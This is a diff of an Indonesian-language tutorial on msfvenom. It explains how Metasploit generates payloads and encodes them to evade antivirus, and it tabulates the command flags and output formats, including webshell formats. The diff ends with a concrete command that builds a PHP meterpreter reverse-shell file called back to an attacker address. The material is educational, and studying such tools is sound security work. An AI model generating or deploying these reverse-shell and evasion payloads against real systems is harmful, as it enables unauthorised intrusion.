@@ -6,29 +6,36 @@
 
 ## A. Apa Itu MSFvenom?
 
-`msfvenom` adalah tool bawaan dari Metasploit yang digunakan untuk:
-- Membuat payload eksploitasi (`reverse shell`, `Meterpreter`, `dll`).
-- Meng-encode payload untuk menghindari antivirus.
-- Meng-output payload dalam berbagai format (`exe`, `elf`, `raw`, `c`, `dll`).
+[MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) adalah sebuah tool dalam kerangka kerja Metasploit Framework yang digunakan untuk membuat payload berbahaya (exploit code) dalam berbagai format, seperti `.exe`, `.apk`, `.elf`, `.py`, dan `lainnya`. Tool ini menggabungkan dua alat lama di Metasploit, yaitu:
+- `msfpayload`: Untuk membuat payload
+- `msfencode`: Untuk mengenkripsi/encode payload agar menghindari antivirus
 
-## B. Struktur Dasar Perintah MSFvenom:
+Sekarang semuanya menjadi satu di `msfvenom`.
+
+## B. Fungsi Utama MSFvenom:
+- Membuat payload untuk berbagai platform (`Windows`, `Android`, `Linux`, `Mac`, `dll`.)
+- Encode payload agar lebih sulit dideteksi antivirus
+- Menyesuaikan payload dengan IP dan port tertentu (misalnya reverse shell)
+- Export payload dalam berbagai format: `.exe`, `.apk`, `.sh`, `.py`, `.asp`, `.c`, `dll`.
+
+## C. Struktur Dasar Perintah MSFvenom:
 
 ```
-msfvenom -p <PAYLOAD> LHOST=<IP_ATTACKER> LPORT=<PORT_LISTENER> -f <FORMAT_OUTPUT> -o <NAMA_FILE>
+msfvenom -p <PAYLOAD> LHOST=<IP_ATTACKER> LPORT=<PORT_LISTENER> -e <JENIS_ENCODER> -i <ITERASI> -f <FORMAT_OUTPUT> -o <NAMA_FILE>
 ```
 
 Keterangan:
 
 | Parameter | Fungsi |
 |:--:|:--:|
-| `-p` | Memilih jenis payload | 
-| `LHOST` | IP lokal/attacker |
-| `LPORT` |	Port listener di attacker |
-| `-f` | Format file output (`exe`, `elf`, `raw`, `dll`) |
-| `-o` | Nama file output |
-| `-e` | Encoder yang digunakan |
-| `-i` | Jumlah iterasi encoder |
+| `-p` | Jenis payload yang ingin digunakan | 
+| `LHOST` | IP Attacker |
+| `LPORT` |	Port listener (bisanya port: `4444`) |
+| `-e` | Jenis encoder yang ingin digunakan |
+| `-i` | Jumlah iterasi untuk encoder |
 | `-n` | Jumlah byte NOP (NOP sled) |
+| `-f` |  Format file output (`exe`, `elf`, `raw`, `dll`) |
+| `-o` | Nama file output |
 
 ## C. Contoh Payload Windows
 
@@ -68,6 +75,12 @@ Output: file `ELF` untuk Linux.
 | `asp, jsp`	| Webshell payload |
 | `dll, macho, rb, dll`	| Format lainnya |
 
+Untuk melihat semua format yang ada pada MSFvenom ketikkan:
+
+```
+msfvenom --list formats
+```
+
 ## F. Menampilkan Semua Payload yang Tersedia:
 
 ```
@@ -84,7 +97,7 @@ Output-nya cocok untuk disisipkan dalam exploit `C` manual.
 
 ## H. Membuat Web Payload (PHP/ASP/JSP)
 
-Contoh Payload PHP:
+Contoh payload PHP:
 
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
